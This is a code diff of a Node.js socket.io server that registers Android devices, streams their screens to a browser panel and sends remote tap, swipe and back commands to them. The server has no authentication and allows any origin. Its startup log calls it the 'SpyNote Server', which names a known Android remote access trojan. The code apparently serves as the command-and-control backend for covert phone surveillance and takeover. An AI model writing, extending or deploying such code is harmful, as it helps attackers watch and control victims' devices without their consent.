@@ -1,124 +1,105 @@
 const express = require('express');
 const http = require('http');
-const WebSocket = require('ws');
-const compression = require('compression');
+const socketIo = require('socket.io');
 const path = require('path');
+const compression = require('compression');
 
 const app = express();
 const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
+
+const io = socketIo(server, {
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    },
+    pingTimeout: 60000
+});
 
 app.use(compression());
+app.use(express.static('public'));
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
-/* ===============================
-   DATA STORES (SAME AS BEFORE)
-================================ */
+// Store connected devices
+const devices = new Map();
 
-// Registered devices info (REST)
-const registeredDevices = new Map(); 
-// deviceId => ws (Android live connection)
-const liveDevices = new Map();       
-// Browser panels
-const panels = new Set();
-
-/* ===============================
-   REST APIs (UNCHANGED)
-================================ */
-
+// Register device
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
 
     if (deviceId) {
-        registeredDevices.set(deviceId, {
-            model, brand, version, status
-        });
-        console.log('📌 Device registered:', deviceId);
+        devices.set(deviceId, { model, brand, version, status });
+        console.log("Device registered:", deviceId);
     }
 
     res.json({ success: true });
 });
 
+// Get devices
 app.get('/devices', (req, res) => {
-    res.json(Array.from(registeredDevices.entries()));
+    res.json(Array.from(devices.entries()));
 });
 
-/* ===============================
-   PURE WEBSOCKET HANDLER
-================================ */
+// Socket connection log
+io.on('connection', (socket) => {
+    console.log('New connection:', socket.id);
 
-wss.on('connection', (ws, req) => {
-    const params = new URLSearchParams(req.url.replace('/?', ''));
-    const deviceId = params.get('deviceId'); // Android
-    const role = params.get('role');         // panel
-
-    /* ---------- ANDROID DEVICE ---------- */
-    if (deviceId) {
-        liveDevices.set(deviceId, ws);
-        console.log('📱 Android connected:', deviceId);
-
-        ws.on('message', (msg) => {
-            try {
-                const data = JSON.parse(msg.toString());
-
-                // SCREEN FRAME
-                if (data.type === 'screen') {
-                    panels.forEach(panel => {
-                        if (panel.readyState === WebSocket.OPEN) {
-                            panel.send(JSON.stringify(data));
-                        }
-                    });
-                }
-
-                // HEARTBEAT (optional)
-                if (data.type === 'heartbeat') {
-                    // console.log('💓 Heartbeat:', deviceId);
-                }
-
-            } catch (err) {
-                console.error('❌ Invalid device JSON');
-            }
-        });
-
-        ws.on('close', () => {
-            liveDevices.delete(deviceId);
-            console.log('❌ Android disconnected:', deviceId);
-        });
-
-        return;
-    }
-
-    /* ---------- BROWSER CONTROL PANEL ---------- */
-    if (role === 'panel') {
-        panels.add(ws);
-        console.log('🖥 Control panel connected');
-
-        ws.on('message', (msg) => {
-            try {
-                const cmd = JSON.parse(msg.toString());
-                const target = liveDevices.get(cmd.deviceId);
-
-                if (target && target.readyState === WebSocket.OPEN) {
-                    target.send(JSON.stringify(cmd));
-                }
-            } catch (err) {
-                console.error('❌ Invalid panel command');
-            }
-        });
-
-        ws.on('close', () => {
-            panels.delete(ws);
-            console.log('🖥 Panel disconnected');
-        });
-    }
+    socket.on('disconnect', () => {
+        console.log('Disconnected:', socket.id);
+    });
 });
 
-/* ===============================
-   SERVER START
-================================ */
+// Receive screen frame from device
+io.on('connection', (socket) => {
+    socket.on('screen-frame', (data) => {
+        const { deviceId, width, height, data: frameData } = data;
+        socket.to(deviceId).emit('screen-update', data);
+    });
+});
+
+// Control handlers
+io.on('connection', (socket) => {
+
+    // Select device
+    socket.on('select-device', (deviceId) => {
+        socket.join(deviceId);
+        socket.emit('device-selected', deviceId);
+    });
+
+    // Tap control
+    socket.on('tap', (data) => {
+        const { deviceId, x, y } = data;
+
+        io.to(deviceId).emit('control', {
+            action: 'tap',
+            x: x * 1080 / 400,   // Scale to device resolution
+            y: y * 1920 / 800
+        });
+    });
+
+    // Swipe control
+    socket.on('swipe', (data) => {
+        const { deviceId, startX, startY, endX, endY } = data;
+
+        io.to(deviceId).emit('control', {
+            action: 'swipe',
+            startX: startX * 1080 / 400,
+            startY: startY * 1920 / 800,
+            endX: endX * 1080 / 400,
+            endY: endY * 1920 / 800
+        });
+    });
+
+    // Back button
+    socket.on('back', (data) => {
+        const { deviceId } = data;
+
+        io.to(deviceId).emit('control', {
+            action: 'back'
+        });
+    });
+});
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 Pure WebSocket Server running on port ${PORT}`);
+    console.log(`SpyNote Server running on port ${PORT}`);
 });
